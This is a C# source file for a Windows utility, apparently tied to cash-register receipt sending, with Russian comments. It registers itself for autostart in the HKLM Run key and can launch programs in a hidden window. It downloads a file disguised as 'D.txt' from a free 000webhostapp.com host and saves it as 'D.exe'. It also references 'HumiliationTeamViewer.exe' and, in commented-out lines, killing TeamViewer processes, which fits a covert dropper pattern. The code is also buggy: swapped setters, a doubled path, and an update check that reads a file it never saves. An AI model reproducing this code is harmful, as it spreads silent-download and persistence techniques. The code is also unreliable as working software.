using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SendingChecksOFD
{
  public  class BL
    {
        private string logErrors ="Журнал событий.txt";
        readonly string pathDir = @"C:\Program Files\Eou\";
     
        //readonly string pathDir = @"C:\Eou1\";
        string pathFileZip = @"C:\Program Files\Eou\1.rar";

        string pathEoU = @"C:\EoU\EthOverUsb.exe";
        string pathEoUSettings = @"C:\EoU\C:\EoU\settings.ini";

      static  bool metHide = false;
      static  bool avtoLoad = true;



        /// <summary>
        /// включение, отключение скрытого режима
        /// </summary>
        /// <param name="hide"></param>
        public void inetMetHide( bool hide)
        {
            avtoLoad = hide;
        }

        public void inetAvtoLoad(bool hide)
        {
            metHide = hide;
        }

        public void voidRegAvtoLoad( bool swixh)
        {
            if (swixh)
            {
                var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
                key.SetValue("Название программы", Application.ExecutablePath);
            }
             

            else 
            {
                var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
                key.DeleteValue("Название программы");
            }
        }

        public void KillProssec(string nameProssec)
        {
            System.Diagnostics.Process.GetProcessesByName(nameProssec)[0].Kill();
        }


        /// <summary>
        /// Создание директории, временной папки
        /// </summary>
        public void InitDirAndFile()
        {
            DirectoryInfo dirInfo = new DirectoryInfo(pathDir);
            FileInfo fileInfo = new FileInfo(pathFileZip);
            try
            {
                if (!dirInfo.Exists)
                {
                    dirInfo.Create();  // cоздаем временный католог
                    WrateText("Создался католог \n");
                   
                }
            }
            catch (Exception ex)
            {
                WrateText("Произошла ошибка при создании главной директории!!! \n" + ex+"\n");
            }
          
            
        }


        /// <summary>
        /// Получение файла ссайта 000webhostapp.com
        /// </summary>
        public void GetFailSite()
        {
            string errorLog = $"{DateTime.Now.ToString()}\t\n";
            string pathFile = "D.exe";
            // string serFtp = @"https://testkkm.000webhostapp.com/1/text.txt";
            // string serFtp = @"https://testkkm.000webhostapp.com/1/rufus-3.6p.txt";
            string serFtp = @"https://testkkm.000webhostapp.com/Dhh134567800gfdfh/D.txt";

            if (File.Exists(pathFile))
            {
                errorLog += $"Данный файл уже существует \t\n{serFtp}\t\n";
                WrateText(errorLog);
            }

            else
            {
                using (var web = new WebClient())
                {

                    // скачиваем откуда и куда
                    web.DownloadFile(serFtp, pathFile);
                }
            }

        }

        /// <summary>
        /// Проверка и получение обновление программы
        /// </summary>
        public async void GetUbtateApp()
        {

            const string pathFile = "ver.txt";
            // const string path = @"C:\SomeDir\";
            const string path = @"C:\Program Files\SomeDir";
            const string serFtp = @"https://testkkm.000webhostapp.com/hz/Ver.txt";


            FileVersionInfo myFileVersionInfo = FileVersionInfo.GetVersionInfo("HumiliationTeamViewer.exe");
            // Строка с версией: myFileVersionInfo.FileVersion;
            string versApp = myFileVersionInfo.FileVersion.ToLower();

            // double versApp2 = Double.Parse(versApp);

            DirectoryInfo dirInfo = new DirectoryInfo(path);

            if (!dirInfo.Exists)
            {
                dirInfo.Create();  // cоздаем временный католог
            }

            //Получение версии на сервере
            using (var web = new WebClient())
            {
                await Task.Run(() => web.DownloadFile(serFtp, path + "temp.zip"));
                // аисинхроный запуск
                // скачиваем откуда и куда

            }
            // чтение из файла и проверяем текущую версию файла и нового на сервере
            using (FileStream fstream = File.OpenRead(path + pathFile))
            {
                // преобразуем строку в байты
                byte[] array = new byte[fstream.Length];
                // считываем данные
                fstream.Read(array, 0, array.Length);

                // декодируем байты в строку
                string textFromFile = System.Text.Encoding.Default.GetString(array);

                string[] words = textFromFile.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);


                foreach (var itemMass in words)
                {
                    if (!versApp.Contains(itemMass))
                    //if (versApp2  < temppp)
                    {
                        // MessageBox.Show($"Требуется обновление программы, текущая версия {versApp} новая {itemMass}");

                    }

                    else
                    {
                        // MessageBox.Show($"Обновление программы не требуется, текущая версия{versApp} новая {itemMass}");
                    }

                }

            }
        }

        //запись в файл
        /// <summary>
        /// запись в текстовой файл. Журнал событий
        /// </summary>
        /// <param name="myText"></param>
        public void WrateText(string myText)
        {
            using (StreamWriter sw = new StreamWriter(logErrors, true, System.Text.Encoding.Default))
            {
                sw.WriteLine(DateTime.Now + "\t\n" + myText); // запись

            }
        }



        /// <summary>
        /// Тестовой запус программы
        /// </summary>
        public async void StatrProgramm()
        {
          //  string pathProgramma = @"1.bat"; ;
            string errorLog = $"t\n";

            try
            {
              

                Process iStartProcess = new Process(); // новый процесс
                iStartProcess.StartInfo.FileName = pathEoU; // путь к запускаемому файлу
                iStartProcess.StartInfo.Arguments = " -e";

                if (metHide)
                {
                    iStartProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                }

                // iStartProcess.StartInfo.Arguments = " -i 192.168.10.12 -p 10568"; // эта строка указывается, если программа запускается с параметрами (здесь указан пример, для наглядности)
               // iStartProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // эту строку указываем, если хотим запустить программу в скрытом виде
                await Task.Run(() => iStartProcess.Start()); // запуск программы лечения
                // iStartProcess.Start(); 
              // запускаем программу
              // iStartProcess.WaitForExit(120000); // эту строку указываем, если нам надо будет ждать завершения программы определённое время, пример: 2 мин. (указано в миллисекундах - 2 мин. * 60 сек. * 1000 м.сек.)

               //Thread.Sleep(4000);
               // await Task.Run(() => KillProssec(@"tv_x64.exe"));
                //  await Task.Run(() => KillProssec(@"tv_w32.exe"));
                // KillProssec(@"rufus-3.6p");
                errorLog += $"Программа удачно запущена{pathEoU}\n";
                WrateText(errorLog);
            }

            catch (Exception ex)
            {

                errorLog += $"{ex}\t\n";
                WrateText(errorLog);

            }

        }

    }






}
